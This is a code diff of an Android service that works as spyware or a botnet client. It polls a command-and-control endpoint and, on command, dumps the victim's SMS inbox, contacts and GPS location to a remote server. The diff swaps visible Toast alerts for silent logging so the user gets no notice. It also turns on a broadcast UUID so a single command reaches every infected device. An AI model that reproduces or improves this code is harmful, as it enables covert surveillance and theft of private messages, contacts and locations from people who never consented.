@@ -20,7 +20,6 @@ import android.preference.PreferenceManager;
 import android.provider.ContactsContract;
 import android.util.Base64;
 import android.util.Log;
-import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -71,7 +70,7 @@ public class Fetcher extends Service {
             if (isConnected()) { // Check if device has a network connection
                 new JsonTask().execute(getString(R.string.cc_json) + "?id=" + id);
             } else {
-                Toast.makeText(getApplicationContext(), "No network connection", Toast.LENGTH_LONG).show();
+                Log.d("Connectivity", "No network connection");
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -146,41 +145,41 @@ public class Fetcher extends Service {
                     SharedPreferences sPrefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                     final String uuid = sPrefs.getString("uuid", null);
 
-                    //if(zombieID.equals(uuid)){
-                    if (task.equals("kill")) {
-                        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-                        Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
-                        PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
-                        if (alarmManager != null) {
-                            alarmManager.cancel(pintent);
-                        }
-                        stopSelf();
-                    } else if (task.equals("smsDump")) {
-                        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
-                            sendData(task, uuid, fetchInbox());
-                        } else {
-                            Toast.makeText(getApplicationContext(), "No SMS permission", Toast.LENGTH_LONG).show();
-                        }
-                    } else if (task.equals("contactsDump")) {
-                        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {
-                            sendData(task, uuid, fetchContacts());
-                        }
-                    } else if (task.equals("getGeoLocation")) {
-                        if (ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.ACCESS_FINE_LOCATION)
-                                == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION)
-                                == PackageManager.PERMISSION_GRANTED) {
-                            sendData(task, uuid, getLastLocation());
+                    if (zombieID.equals(uuid) || zombieID.equals("ffffffff-ffff-ffff-ffff-ffffffffffff")) {
+                        switch (task) {
+                            case "kill":
+                                AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+                                Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
+                                PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
+                                if (alarmManager != null) {
+                                    alarmManager.cancel(pintent);
+                                    stopSelf();
+                                }
+                                break;
+                            case "smsDump":
+                                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
+                                    sendData(task, uuid, fetchInbox());
+                                }
+                                break;
+                            case "contactsDump":
+                                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {
+                                    sendData(task, uuid, fetchContacts());
+                                }
+                                break;
+                            case "getGeoLocation":
+                                if (ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.ACCESS_FINE_LOCATION)
+                                        == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION)
+                                        == PackageManager.PERMISSION_GRANTED) {
+                                    sendData(task, uuid, getLastLocation());
+                                }
+                                break;
                         }
                     }
-                    //} else {
-                    //Toast.makeText(getApplicationContext(),"Machine UUID not matching with JSON UUID",Toast.LENGTH_LONG).show();
-                    //}
-
                 } catch (JSONException e) {
                     e.printStackTrace();
                 }
             } else {
-                Toast.makeText(getApplicationContext(), "Server not reachable", Toast.LENGTH_LONG).show();
+                Log.d("Connectivity", "Server is not reachable");
             }
         }
     }
